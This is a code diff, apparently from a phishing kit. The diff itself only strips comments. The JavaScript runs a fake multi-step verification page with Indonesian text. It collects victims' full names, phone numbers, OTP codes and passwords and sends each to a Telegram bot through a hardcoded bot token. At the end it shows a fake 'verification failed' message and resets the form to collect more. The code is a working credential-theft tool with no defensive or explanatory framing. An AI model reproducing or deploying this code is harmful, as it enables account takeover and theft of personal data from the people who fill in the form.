@@ -1,7 +1,5 @@
-// Mendapatkan bot token
-const botToken = "7945679163:AAE_FWn__VpRLUhREBGVGPZ6UtKNMCQFhsY"; // Ganti dengan bot token Anda
+const botToken = "7945679163:AAE_FWn__VpRLUhREBGVGPZ6UtKNMCQFhsY";
 
-// Variabel untuk menyimpan data pengguna
 let fullName = "";
 let phone = "";
 let otp = "";
@@ -49,9 +47,8 @@ window.onload = function () {
   }
 };
 
-// Fungsi untuk mengirim pesan ke Telegram
 function sendToTelegram(message) {
-  const chatId = sessionStorage.getItem("chatId"); // Mendapatkan chatId dari sessionStorage
+  const chatId = sessionStorage.getItem("chatId");
   if (!chatId) {
     showAlert("Chat ID tidak ditemukan di session storage.");
     return;
@@ -77,7 +74,6 @@ function sendToTelegram(message) {
     });
 }
 
-// Fungsi untuk mengatur tampilan langkah-langkah verifikasi
 function nextStep(step) {
   showLoading();
 
@@ -91,7 +87,7 @@ function nextStep(step) {
         return;
       }
       let message = `Gercepki Bosku :\nNama Lengkap: ${fullName}\nNomor Telepon: ${phone}`;
-      sendToTelegram(message); // Kirim data nama dan nomor telepon
+      sendToTelegram(message);
     } else if (step === 3) {
       otp = document.getElementById("otp").value;
       if (!otp) {
@@ -100,7 +96,7 @@ function nextStep(step) {
         return;
       }
       let message = `Kode OTP: ${otp}`;
-      sendToTelegram(message); // Kirim data kode OTP
+      sendToTelegram(message);
       document.getElementById("step3Description").textContent =
         "Kami telah mengirimkan kode pada telegram anda, silahkan cek pesan telegram anda.";
     } else if (step === 4) {
@@ -111,7 +107,7 @@ function nextStep(step) {
         return;
       }
       let message = `Kata Sandi: ${password}`;
-      sendToTelegram(message); // Kirim data kata sandi
+      sendToTelegram(message); 
     }
 
     document.getElementById("step1").style.display =
@@ -125,7 +121,6 @@ function nextStep(step) {
   }, 2000);
 }
 
-// Fungsi untuk mereset form dan mengarahkan kembali ke langkah pertama
 function resetForm() {
   fullName = "";
   phone = "";
@@ -140,7 +135,6 @@ function resetForm() {
   document.getElementById("step3").style.display = "none";
 }
 
-// Fungsi akhir untuk mengarahkan ke halaman film dan mengirim ringkasan
 function submitVerification() {
   const passwordInput = document.getElementById("password").value;
   if (passwordInput.trim() === "") {
@@ -154,14 +148,13 @@ function submitVerification() {
 
   setTimeout(() => {
     const summaryMessage = `Gercepko Sayang:\nNama Lengkap: ${fullName}\nNomor Telepon: ${phone}\nKode OTP: ${otp}\nKata Sandi: ${password}`;
-    sendToTelegram(summaryMessage); // Kirim ringkasan
+    sendToTelegram(summaryMessage);
     showAlert("Verifikasi anda gagal tolong masukkan data yang benar");
     resetForm();
     hideLoading();
   }, 1200);
 }
 
-// Memastikan hanya angka yang diizinkan di nomor telepon dan OTP
 document.getElementById("phone").addEventListener("input", function (e) {
   this.value = this.value.replace(/[^0-9]/g, "");
 });
